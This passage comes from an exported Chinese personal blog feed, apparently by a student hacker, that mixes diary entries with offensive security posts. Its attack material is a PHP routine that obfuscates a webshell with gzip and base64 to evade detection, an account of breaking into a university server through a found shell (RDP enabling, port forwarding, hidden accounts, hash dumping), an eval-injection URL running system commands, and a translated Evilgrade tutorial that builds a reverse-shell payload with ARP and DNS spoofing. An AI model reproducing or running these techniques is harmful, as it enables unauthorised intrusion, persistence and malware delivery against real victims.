q/XdaXxhnf&amp;!BLKXYD[QLFTSYVYDL]Yn`u}`lfbLcdxnmplsVJts_stdn!Kwjmuq_sbL[jt[Mugqn!V`af(+#nsnq@.)x}v(792q/ing0Ek3# 这段代码还有部分没解出来，但是基本可以明白怎么回事了！ 他就是修改你的注册表，把http://www.633w.net.cn弄成你ie浏览器的主页！ &nbsp;]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>vbs</tag>
        <tag>解密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[全功能PHP SHELL汉化版修改版]]></title>
    <url>%2F2012%2F02%2F25%2F%E5%85%A8%E5%8A%9F%E8%83%BDPHP-SHELL%E6%B1%89%E5%8C%96%E7%89%88%E4%BF%AE%E6%94%B9%E7%89%88%2F</url>
    <content type="text"><![CDATA[一直用的就是spider Clean Backdoor！看见了90sec论坛发了个功能比较多得一个版本！&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; 我比较喜欢汉化的！（英语重修中。。。） ，其实英文版在渗透测试外国站的时候兼容很好！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 英文版：[url]http://www.90sec.org/thread-1566-1-1.html[/url] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修改：1.汉化 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.mysql_udf提权部分代码优化 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 换了udf &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 高版本提权兼容更好 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (其实就是把90sec的那个高版本提权神器做了移植) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3.其他代码优化 &nbsp;&nbsp;&nbsp; 最后测试除ie外的其他浏览器兼容都不是很好！估计是css出的问题！小菜前端设计很差就没去管它！ &nbsp;&nbsp; 有汉化bug请回复！如果出现乱码！请自己修改编码！我传的是gb1213！ 汉化过后变得很大！大家可以自己压缩！附上加密压缩和解密代码！ 加密代码： &lt;?php function encode_file_contents($filename) { $type=strtolower(substr(strrchr($filename,’.’),1)); if(’php’==$type &amp;&amp; is_file($filename) &amp;&amp; is_writable($filename)){// 如果是PHP文件 并且可写 则进行压缩编码 $contents = file_get_contents($filename);// 判断文件是否已经被编码处理 $contents = php_strip_whitespace($filename); // 去除PHP头部和尾部标识 $headerPos = strpos($contents,’&lt;?php’); $footerPos = strrpos($contents,’?&gt;’); $contents = substr($contents,$headerPos+5,$footerPos-$headerPos); $encode = base64_encode(gzdeflate($contents));// 开始编码 $encode = ’&lt;?php’." eval(gzinflate(base64_decode("."’".$encode."’"."))); ?&gt;"; return file_put_contents($filename,$encode); } return false; } //调用函数 $filename=’123.php’; //你的大马 encode_file_contents($filename); echo "OK,加密完成！" ?&gt; 解密代码： 这个是循环解密的！一般很多都是加密很多次！很久以前写的! &lt;?php $b = ’’; //base64密文 $c = ’dam.php’; for($i=0;$i&lt;1;$i--) { $b=base64_decode($b); $b=trim(gzinflate($b)); $b=trim(str_replace("?&gt;&lt;?php","",$b)); $b=trim(str_replace("?&gt;&lt;?","",$b)); $b=trim(str_replace("eval(gzinflate(base64_decode(’","",$b)); $b=trim(str_replace("’)));","",$b)); $d=substr($b,0,1); if(0==strcmp($d,"")) { break; } file_put_contents($c,"&lt;?php"." ".$b."?&gt;"); } echo "解密成功！"; ?&gt;]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>shell</tag>
        <tag>php大马</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[这本书太打击人了]]></title>
    <url>%2F2012%2F02%2F19%2F%E8%BF%99%E6%9C%AC%E4%B9%A6%E5%A4%AA%E6%89%93%E5%87%BB%E4%BA%BA%E4%BA%86%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp; 刚发了书！一看！我插！ &nbsp; &nbsp;]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
      <tags>
        <tag>杂事</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决emlog相册插入日志时只有一个小点]]></title>
    <url>%2F2012%2F02%2F15%2F%E8%A7%A3%E5%86%B3emlog%E7%9B%B8%E5%86%8C%E6%8F%92%E5%85%A5%E6%97%A5%E5%BF%97%E6%97%B6%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%E5%B0%8F%E7%82%B9%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp; &nbsp;唉！悲剧啊！我把代码分析了几个小时，最后发现都是对的！原来是因为新浪sae的storage是自动开启防盗链的！所以getimagesize()函数取不到高和宽！ &nbsp;&nbsp;&nbsp; 解决办法就很简单了！把防盗链关了就是了！ &nbsp;&nbsp;&nbsp; ————————– ps：其实所有用的这个函数的插件都会出现这个问题！写插件的童鞋注意哦！]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>sae</tag>
        <tag>emlog</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开学前的闲言碎语]]></title>
    <url>%2F2012%2F02%2F15%2F%E5%BC%80%E5%AD%A6%E5%89%8D%E7%9A%84%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;时间在不知不觉中悄悄溜走了！还有几天就要踏上回校的路了！心忽然的不能平静！不知道该想什么，该做什么！乱糟糟的思绪不知从何寻起！不知是前段时间太累了还是回校的时间临近而产生的不舍！总之代码看不下去了！视频也是！一切想学的东西都让人感到疲惫！不知是身体还是心灵的困倦让我感觉我所在的空间很是空虚！忽然我才发觉原来我的世界中只有我和我要学习的东西！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 累了！我该干什么呢？高中的时候看着课本累了！我会想：如果这是我感兴趣的东西，我一定会不知疲倦的！但是现在才知道！只要是人就会累的！也许我该去打篮球，去学些文艺的东西，那样在我和代码的世界出现停滞的时候，我还可以去玩些其他的东西！知识是浩瀚的，短短的几年是学不完你喜欢的所有东西，何况才半个多月呢！ &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;想着想着，亦或是家的无忧无虑快要完了！当回到学校的时候我的身份也将改变了，从什么都不用管的儿子到什么都要管的独立求学的游子！看看前路，满是荆棘，呼吸变得沉重，肩上刚放下的担子又要挑起！忽然我明白了为什么明知道回家除了呆在家里，基本没什么好玩的，还要义无反顾的为放假而欢呼，那是因为家的呼唤！驿站的呼唤！儿时写作文时老师说家是每个人的港湾，现在我终于明白那么一点了！ &nbsp;&nbsp;&nbsp;&nbsp; 听着主机箱中散热风扇的嗡嗡劳作声，我有一点急了！前路很是坎坷，而我现在的状态却是这样的低靡，我得放松自己，调整好自己，不管前面是魑魅魍魉，还是满堂喝彩，该来总是会来的，一个平常心去面对亦或是最好的办法！在此我想到了佛家的禅！道家的自然。世界本就像一锅沸腾的水，平静的面对才能抵制它对你的影响！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;思绪越飘越远～～～ &nbsp;&nbsp;&nbsp;&nbsp;该来的我所要面对的，计划好前行的路径，按部就班，随机应变，学一学路飞的洒脱，有时一根筋也是一件幸事。 &nbsp;&nbsp;]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
      <tags>
        <tag>心情</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[90sec.org的wve修改版]]></title>
    <url>%2F2012%2F02%2F07%2F90sec-org%E7%9A%84wve%E4%BF%AE%E6%94%B9%E7%89%88%2F</url>
    <content type="text"><![CDATA[修改： 1.插件使用修改 先uses plugins xxxx.inc set host www.xxx.com 最后就是直接使用 -xxxx &nbsp; 2.我把它的函数封装成了3个类 分别是辅助类assist：help()、option()、version() &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;运用类tools：search()、set()、uses()、exploit()、show() &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;插件类plugins：update()、wwwscan() &nbsp;]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>90sec.org</tag>
        <tag>php</tag>
        <tag>wve</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透xx网站服务器到内网渗透]]></title>
    <url>%2F2012%2F01%2F30%2F%E6%B8%97%E9%80%8Fxx%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%88%B0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[&nbsp; 一日群里童鞋发来一个站，是xx大学二级站点，问我可不可以拿下，于是乎群里同学们群情激动，一阵过后，有位同学发现了个前辈留下的shell，一看是落叶牛的shell，默认密码admin，进去了！于是乎那位童鞋把shell给了我，说给大家演示下提权和内网渗透！ &nbsp;&nbsp;&nbsp; 我一看组件基本都在，目录权限也大，脚本asp php aspx都支持，mssql mysql都有！心想这个估计很容易！于是乎答应了！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 穿了个cmd上去，执行whoami &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 在执行systeminfo看看补丁情况，这个图就不截了，补丁打的比较全，我是没有什么独门的本地溢出！转向数据库提权 &nbsp;&nbsp;&nbsp; 先查看了下一些数据库连接文件，找到了sa，但是网站和数据库是分离的！先把这个sa留着，内网渗透用！ &nbsp;&nbsp;&nbsp; 于是乎我再执行了下tasklist /svc &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 里面有filezilla nginx RemotelyAnywhere.exe mysqld-nt.exe &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 执行sc getkeyname “MySQL” &nbsp;&nbsp;&nbsp;&nbsp; 执行sc qc MySQL &nbsp;&nbsp;&nbsp;&nbsp; 转到此目录，可读，于是乎下载user表，拿到了root密码 &nbsp;&nbsp; 这个时候有了root就需要php提权脚本了！但是asp 和aspx网站所在的目录不支持php，因为iis没有配置php模块，上面已经看见了，他有nginx，查看mysql路径的时候也看见了NPMserv，这个是一个nginx php mysql的集成环境，于是乎查看nginx配置文件d:NPMservginxconfvhost.conf里面有域名 路径等信息，有三个php的我网站，一个是外联的别的服务器网站不在此服务器，一个网站是坏的，最后一个可以！于是乎上php大马！权限很大啊！administrators权限，直接开3389 &nbsp;&nbsp;&nbsp;&nbsp; 执行REG ADD HKLMSYSTEMCurrentControlSetControlTerminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f &nbsp;&nbsp;&nbsp; 问题来了这个是内网啊！怎么3389当去呢？用lcx是最常见的了，但是不成功！这个后面再说！于是乎我就使用aspx的木马上面的端口转发 &nbsp;&nbsp; 先本地监听lcx -listen 7788 6677 &nbsp;&nbsp;&nbsp; 然后用本机的mstsc远程连接，但是一连接就断开了！不成功！于是乎用终端加强版连接127.0.0.1:6677 &nbsp;&nbsp;&nbsp; 成功 &nbsp;&nbsp; 这个web服务器就这么拿下了 &nbsp;&nbsp;&nbsp; 内网渗透开始（其中是各种请教啊！萝莉同学，fans同学。。。。。） &nbsp; 有一台web服务器，于是乎加隐藏帐号，gethash，分析网络拓扑结构，交换机连接内网的6台（至少是6台），在接入路由器，没有设置域控制！ &nbsp; 用web服务器连接db服务器，当然我用sa权限已经开了3389，但是连接总是超时，加强版也不行，于是乎了hd反弹sock5代理，悲剧的没法，lcx转发也不行，反正只要是软件级的程序和其他电脑连接都不行，我猜测是交换机做了端口的限制（猜测），既然这样那我就用脚本级的代码reDuh的80端口来！但是是不行的！一样是超时！为什么呢？因为他的数据传输还是用web服务器的连接db服务器始终会使用到web的mstsc，看个图就清楚了 80端口穿防火墙！但是这儿内网也是不能用，所以我猜测是交换机到的鬼！这个穿透的是我的电脑和web服务器，而不是web服务器和数据可服务器！ &nbsp;&nbsp; 于是乎我有测试了ipc$ ftp都是不行的，狗日的估计就开了个80和89，应为89是连接mssql的数据库端口！既然web-&gt;db不行那我db-&gt;web试试！结果也是一样的！ &nbsp;&nbsp; db服务器没有web环境所以reDuh也是没有办法的！fans同学说用mssql写vbs执行，但是想往db服务器下载东西vbs也需要ftp！即使种了木马进去，估计没法连接！ &nbsp;&nbsp; 既然db没法，库mssql也脱不掉，那换一个其中有一个服务器与web服务器有共享但是需要密码！我查看过db服务器帐号，发现db和web有同一帐号，这个应该密码是一样的，于是忙着个大网站的解密，无果，彩虹表也无果（我就两个小的表，没有7.5g的，或者更大的）！ 我翻目录查到了serv-u这个东西但是我想修改配置文件，用echo命令不能输入|这个管道符，我有用 echo “xxx|xxx” &gt;&gt;xxxx.txt这样这个双引号也被加进去了！ 然后 夜叉 同学帮忙写了个去引号的批处理，但是批处理里面有&gt;&gt;所以我也写不进去！ 时间过去了很久，随着知识的积累现在想想还是有很多办法突破的！！！！]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>内网</tag>
        <tag>提权</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[就这么到了2012了]]></title>
    <url>%2F2011%2F12%2F31%2F%E5%B0%B1%E8%BF%99%E4%B9%88%E5%88%B0%E4%BA%862012%E4%BA%86%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 此时此刻！看着看着2011年就没了！我想！我应该做一个检讨！妈啊！儿子错了！今年还是没有女朋友！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 回想过去的一年！看了很多狗血的电影、视频、电视剧！苍老师教育片也没少看！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 回想过去的一年！专业课学了很多，样样60分！选修课也学了很多，但是基本90以上！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 回想过去的一年！坏事干了不少！好事一件没有！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 回想过去的一年！穿丝袜的学姐走了！穿牛仔裤的学妹来了！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 回想过去的一年！打饼子以是过去，搞基才能与时俱进！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 回想过去的一年！忽悠依旧流行！大爷都会伤不起！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 此时此刻！我想说，爸我错了！我又想换手机了！塞班去了石器时代！android带我们走到了21世纪！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 回想过去的一年！还没玩上苹果！乔布斯已经拜访上帝去了！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 回想过去的一年！卡扎非死了！利比亚人笑的想天上掉票子！金正日死了！朝鲜人哭的想死了爹！&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 回想过去的一年！美女还是处女！现在已是妇女！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 回想过去的一年。。。。。。 &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 此时此刻！我想说！2012啊！妹子啊！我来了！]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
      <tags>
        <tag>2012</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[eval injection]]></title>
    <url>%2F2011%2F12%2F26%2Feval-injection%2F</url>
    <content type="text"><![CDATA[在90sec的论坛看见有人问eval injection的问题！ &lt;?php&nbsp;&nbsp;&nbsp;&nbsp; echo ’&lt;p&gt;&amp;#42——————————-&amp;#42&lt;p&gt;’;&nbsp; echo ’This one can GET :&lt;p&gt;&lt;tb&gt;http://192.168.174.147/test/eval_injection.php?arg=10;%20system%28%27/bin/ls%20/tmp%27%29’;&nbsp; $myvar = ’somevalue’;&nbsp; $x = $_GET[’arg’];&nbsp; echo $x.”&lt;p&gt;”;&nbsp; eval(’$myvar = ’ . $x . ’;’);&nbsp; ?&gt; 结果：列出了/ｔｍｐ下面的文件。这个没问题。 来看下一个，翠花上代码： &lt;?php&nbsp;&nbsp; ##这段代码来自：[url]https://www.owasp.org/index.php/Direct_Dynamic_Code_Evaluation_%28%27Eval_Injection%27%29[/url]&nbsp; $myvar = “varname”;&nbsp;&nbsp; $x = $_GET[’arg’];&nbsp;&nbsp; echo $x.”&lt;p&gt;”;&nbsp; eval(“$myvar = $x;”);&nbsp;&nbsp; ?&gt; 这段代码，有问题（小菜感觉），&nbsp; eval(“$myvar = $x;”);&nbsp; 这里应该执行不了吧。 我的回复： 我再改： &lt;?php $myvar = “$varname”;&nbsp;&nbsp; $x = $_GET[’arg’];&nbsp;&nbsp; echo $x.”&lt;p&gt;”;&nbsp; eval(“$myvar= $x;”); ?&gt; 回显：成功（就不粘贴dir返回的东西了） 我再改： &lt;?php $myvar = “varname”;&nbsp;&nbsp; $x = $_GET[’arg’];&nbsp;&nbsp; echo $x.”&lt;p&gt;”;&nbsp; eval($myvar=$x.’;’); ?&gt; 回显:成功 我再改： &lt;?php $myvar = “varname”;&nbsp;&nbsp; $x = $_GET[’arg’];&nbsp;&nbsp; echo $x.”&lt;p&gt;”;&nbsp; eval($x.’;’); ?&gt; 回显：成功（$myvar这个变量都没用了） 下面我就不再改了！你自己弄吧！ 你可以在测试的时候输出$x和$myvar这两个变量的值！比较他的变化！还有就是 . “ ’ 这个四个符号在语句中的利用！]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>eval</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[忙碌的12月]]></title>
    <url>%2F2011%2F12%2F25%2F%E5%BF%99%E7%A2%8C%E7%9A%8412%E6%9C%88%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很久没写博客了，8月份的时候兴冲冲的做了一个博客！不知不觉3个月快过去了！开始的时候还有点激动的更新博客！现在越来越懒了！今天是“剩蛋”节！到博客发发牢骚！&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 时间飞逝，2011年最后的一个月就这么快完了！作为一个学生12月必然忙碌的，忙着临时抱佛脚考试。 &nbsp;&nbsp;&nbsp;&nbsp; 从12月开始，学校的极客挑战题也开始了第二期，随着一个一个题被干掉！在这个工程中让我学到了很多东西！现在已经结束了，也该做做总结了！ &nbsp;&nbsp;&nbsp;&nbsp; 总的来说，第二期题的难度明显比第一期大很多！（可能是我太菜了！）基础题最先出来！现在都忘了！linux也不单单想第一期是考几个简单的命令了！已经涉及到了shell编程和linux下得反汇编了！web也不单单是注入了，涉及到了webshell和提权了！逆向题更不用说了，以前最多弄过一个jmp跳转就可以跳过验证的我，对第二期的逆向基本无从下手！逆向第一题还是看了6个pe结构的视频才弄出来的，逆向第二题，那个脱壳基本我就是没办法了，更不用说逆向第三题算法了…,编程题第二课映像深刻，应为我是胡乱改跳转给弄出来的！第四题我是钻了一个出题人的漏洞，破解了他的源码给弄出来的，最后逆向2、3、4题和linux第4题没有做出来！基本都是逆向的题目！ &nbsp;&nbsp;&nbsp;&nbsp; 这个是12月开始干的第一件事吧！充实并快乐着！边做边学，学到了很多东西！ &nbsp;&nbsp;&nbsp;&nbsp; 其他时间基本都是复习了！考试啊！学的都是都是文科类的东西！痛苦并郁闷着！ &nbsp;&nbsp;&nbsp;&nbsp; 无聊的时候就看点小说！每当集中精神干一件事情过后，总是感觉很是疲惫，就喜欢在被窝里看点小说！ &nbsp;&nbsp;&nbsp;&nbsp; 这个月月末的后又忙着网络工程学院信息对抗试验班选拔的事情，这个机会对我来说简直是上帝的恩赐！ &nbsp;&nbsp;&nbsp;&nbsp; 缓考，补考，重修，转专业！ &nbsp;&nbsp;&nbsp;&nbsp; 慢慢为了这个机会而奋斗着！ &nbsp;&nbsp;&nbsp;&nbsp; 忙碌的12月！]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[帝国下载系统申明的变量整理]]></title>
    <url>%2F2011%2F12%2F04%2F%E5%B8%9D%E5%9B%BD%E4%B8%8B%E8%BD%BD%E7%B3%BB%E7%BB%9F%E7%94%B3%E6%98%8E%E7%9A%84%E5%8F%98%E9%87%8F%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[帝国模板变量： 站点地址：[!–edown.url–] 页面关键字：[!–pagekey–] 热门下载：[!–empiredown–] 分类名称：[!–class.name–] 页面链接： [!–softtime–] 文件扩展名：&nbsp; [!–filetype–] 软件版本： [!–soft_version–] 软件语言： [!–language–] 下载点数 ：[!–downfen–] 发布者： [!–adduser–] 总下载数 [!–count_all–] 日下载数：[!–count_day–] 关键字 ： [!–keyboard–] 实时显示下载数:&lt;script src=”[!–edown.url–]ViewClick?softid=[!–softid–]&amp;all=1&amp;month=1&amp;week=1&amp;day=1”&gt;&lt;/script&gt; 页面导航: [!–empiredown–] 页面简介：[!–pagedes–] 最新下载：[!–empiredown.newjs–] 分类ID: [!–class.id–] 页面标题 ：[!–pagetitle–] 父分类ID：[!–bclass.id–] 父分类名称：[!–bclass.name–] 软件名称：[!–softname–] 软件ID： [!–softid–] 所属专题：[!–ztname–] 软件简介：[!–softsay–] 文件大小：[!–filesize–] 预览图：[!–softpic–] 授权形式：[!–soft_sq–] 软件类型：[!–sifttype–] 下载地址：[!–downpath–] 在线观看地址：[!–onlinepath–] 下载级别：[!–foruser–] 软件等级： [!–star–] 作者：[!–writer–] 官方网站：[!–homepage–] 月下载数：[!–count_month–] 周下载数：[!–count_week–] 运行环境： [!–soft_fj–] 演示地址：[!–demo–] 相关链接：[!–otherlink–] 分类列表：[!–class.menu–] &nbsp;]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>帝国下载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【翻译】在backtrack5上用Evilgrade工具15步入侵windows]]></title>
    <url>%2F2011%2F12%2F03%2F%E3%80%90%E7%BF%BB%E8%AF%91%E3%80%91%E5%9C%A8backtrack5%E4%B8%8A%E7%94%A8Evilgrade%E5%B7%A5%E5%85%B715%E6%AD%A5%E5%85%A5%E4%BE%B5windows%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 这篇文章是我无意中看见的evligrade的一个利用教程，由于是英文的所以翻译给大家看看！感觉对大家的认识和提高都有很多的作用，其实漏洞无处不在！开拓我们的思维，才是关键！ 好了，废话不多说！(图裂了！我就不改了！就看原作者的吧！) 此文摘自：http://vishnuvalentino.com/computer/15-step-to-hacking-windows-using-evilgrade-2-0-on-backtrack-5/ 作者：Vishnu Valentino 翻译：L.N. 题目：在backtrack5上用Evilgrade工具15步入侵windows 文章类型：辅导类 难度：中高级 evilgrade简介： &nbsp;&nbsp;&nbsp;&nbsp; evilgrade是一个模块化的框架结构，使用者可以利用脆弱的软件的升级更新机制，来欺骗用户安装自己注入的其他程序（木马、病毒）。它提供了代理和默认快速配置，还有web服务和dns服务模块，可以很容易的更新设置，并且还可以自动配置新的代理！ 来自：[http://www.infobytesec.com[/url](http://www.infobytesec.com[/url) 使用工具： 1. Evilgrade 2. Backtrack 5 步骤： 1.解压evilgrade然后运行它用下面的命令 &nbsp; tar xvfz isr-evilgrade-2.0.0.tar.gz cd isr-evilgrade-2.0.0.tar.gz/ ./evilgrade 如果你在使用evilgrade的时候出现了错误，你可以参考http://vishnuvalentino.com/tips-and-trick/evilgrade-2-0-error-on-backtrack-5-solved/这篇文章 下面显示的这个图片是你正确运行时的样子 &nbsp; 2.下一步你需要去确定一个应用的目标程序，因为evilgrade将创建一个假的更新注入到目标电脑。使用下面的命令查看可以支持应用的模块。 evilgrade&gt;show modules （命令是show modules，不要evilgrade&gt;也输入进去了，这个便是当前的目录） List of modules: =============== allmynotes amsn appleupdate apptapp apt atube autoit3 bbappworld blackberry bsplayer ccleaner clamwin cpan cygwin dap divxsuite express_talk fcleaner filezilla flashget flip4mac freerip getjar gom googleanalytics growl isopen istat itunes jet jetphoto linkedin miranda mirc nokia nokiasoftware notepadplus openoffice opera orbit osx paintnet panda_antirootkit photoscape quicktime skype sparkle speedbit sunbelt sunjava superantispyware teamviewer techtracker trillian ubertwitter vidbox virtualbox vmware winamp winscp winupdate winzip yahoomsn - 63 modules available. 在这篇辅导文章中，我将使用的目标程序是notepad plus，因此当管理员不加思索的升级这个应用程序的时候，他讲掉进我的陷阱里面。使用这个模块，运行以下命令： evilgrade&gt;configure notepadplus 3.查看选项，你可以使用show options这个命令 在上面的图片中，virtualhost是当管理员升级他的notepad plus时，就会打开这个url连接：notepad-plus.sourceforge.net。下面我们将使用到这个连接。 &nbsp; 4.接下来我们设置一个代理。我们配置一个代理用msfpayload创建一个shell_reverse_tcp evilgrade(notepadplus)&gt;set agent ’["/pentest/exploits/framework3/msfpayload windows/shell_reverse_tcp LHOST=192.168.8.91 LPORT=1234 X &gt; &lt;%OUT%&gt;/tmp/notepadplus.exe&lt;%OUT%&gt;"]’ 解释： /pentest/exploits/framework3/msfpayload ?&gt; 我们将加载这个msfpayload windows/shell_reverse_tcp ?&gt; 当成功的时候我们就可以反弹一个shell回本地 LHOST ?&gt; localhost 你backtrack5的ip地址 / 攻击者的ip地址. LPORT ?&gt; 填一个端口（用于监听） （相关的说明可以看http://www.infobytesec.com/down/isr-evilgrade-Readme.txt） &nbsp; 5.下一步是我们打开evilgrade服务。确保你的80端口是打开的 &nbsp; 6.完成了evilgrade得设置过后，我们还需要配置中间人攻击用ettercap，然后当当管理员升级notpad plus时就会直接连接evilgrade服务。第一步是你需要配置etter.dns pico /usr/share/ettercap/etter.dns &nbsp; notepad-plus.sourceforge.net ?&gt; 这个地址是我们在第三步得到的 &nbsp; 7.接下来我们要用到ettercap “ettercap是什么见http://ettercap.sourceforge.net/” 运行ettercap，打开新的terminal（ctrl+alt+t）运行下面的命令 ettercap -G Click Sniff ?&gt; Unified sniffing ?&gt; 选着你的网卡，在这儿我用eth0. &nbsp; 8.下一步我们需要使用dns_spoof插件，这个插件用于接收目标机器对evilgrade服务的请求。点击 Plugins ?&gt; Manage the plugins ?&gt; 双击 dns_spoof 9.下一步是扫描主机，这部是我们去决定一个目标，点击Hosts ?&gt; Scan for 10.下面是我们网络中得所有主机，我们需要建议一个目标 11.我们还需要去完成中间者攻击去拦截网络中得数据，点击 Mitm ?&gt; Arp poisoning ?&gt; 点击 “Sniff remote connection”. &nbsp; 12.如果上面的每一步都设置正确，就运行ettercap开始嗅探start sniffing 13.接下来我们用nc（netcat）去监听端口1234（这个端口就是我们上面设置的那个） nc是什么我就不多说了不知道的见：From :http://netcat.sourceforge.net/ &nbsp; 新打开一个terminal（ctrl+alt+t）并且运行命令 nc -l -v -p 1234 14.当管理员打开notepad plus时就会被要求升级更新，如下面的图，如果管理员点击yes，就成功了 15.我们的nc就会有东西回显了，因为当管理员点击yes升级完成的时候，我们反弹的shell就成功了 应对方法： 1.直接到官方网站下载最新版本的程序 2.保持反病毒程序是最新的 希望对你有帮助]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>backtrack</tag>
        <tag>evilgrade</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大数减法php代码]]></title>
    <url>%2F2011%2F11%2F09%2F%E5%A4%A7%E6%95%B0%E5%87%8F%E6%B3%95php%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[前几天学的是php的大数加法代码，今天写的是大数 减法代码，过几天再试试大数乘法代码和除法代码！——————————————————————————————————————————————-&lt;?php &nbsp;$big1 = ’999999999999999999999999999999999999999999999’; &nbsp;$big2 = ’99999999999999999999999999’; &nbsp;echo strsub($big1,$big2).”&lt;br/&gt;”; &nbsp;&nbsp;function strsub($str1,$str2){ &nbsp;&nbsp; &nbsp; $res = array();&nbsp; &nbsp; $strd= true;//字符串长度处理&nbsp; &nbsp; if(strlen($str1) &gt; strlen($str2)){ &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; $str2 = str_pad($str2,strlen($str1),’0’,STR_PAD_LEFT);&nbsp;$strd=true;&nbsp; &nbsp; } &nbsp;&nbsp; &nbsp; elseif(strlen($str1) == strlen($str2)){for($i=0;$i&lt;strlen($str1);$i++){if($str1[$i] &gt; $str2[$i]){$strb=true;&nbsp;break;}if($str2[$i] &gt; $str1[$i]){$strb=false;&nbsp;break;}}}else{ &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; $str1 = str_pad($str1,strlen($str2),’0’,STR_PAD_LEFT);$strd=false;&nbsp; &nbsp; } &nbsp;//数组元素循环相减和进位处理&nbsp; &nbsp; for($i =strlen($str1)-1 ,$res[$i]=0; $i&gt;=0; $i–){ &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; $strd?($tmp = $str1[$i] - $str2[$i]):($tmp = $str2[$i] - $str1[$i]); &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; $res[$i] += $tmp;if($i!==0){if($res[$i] &lt; 0 ) {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $res[$i] += 10;$res[$i-1]=0;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 